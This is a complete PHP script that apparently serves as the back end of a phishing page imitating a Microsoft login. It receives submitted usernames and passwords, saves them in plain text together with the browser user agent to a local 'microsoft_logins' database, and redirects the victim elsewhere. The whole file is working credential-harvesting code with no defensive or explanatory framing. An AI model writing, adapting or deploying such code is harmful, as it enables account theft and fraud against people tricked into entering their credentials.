<?php
$host = 'localhost';
$dbname = 'microsoft_logins';
$username = 'root';
$password = '';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Erro na conexão: " . $e->getMessage());
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_POST['username'] ?? '';
    $senha = $_POST['password'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
    if (!empty($usuario) && !empty($senha)) {
        try {
            $sql = "INSERT INTO login_attempts (username, password, user_agent) 
                    VALUES (:username, :password, :user_agent)";
            
            $stmt = $pdo->prepare($sql);

            $stmt->execute([
                ':username' => $usuario,
                ':password' => $senha,
                ':user_agent' => $user_agent
            ]);

            header("Location: redirect.html");
            exit();
            
        } catch(PDOException $e) {
            die("Erro ao salvar: " . $e->getMessage());
        }
    } else {
        header("Location: index.html?error=empty");
        exit();
    }
} else {
    header("Location: index.html");
    exit();
}
?>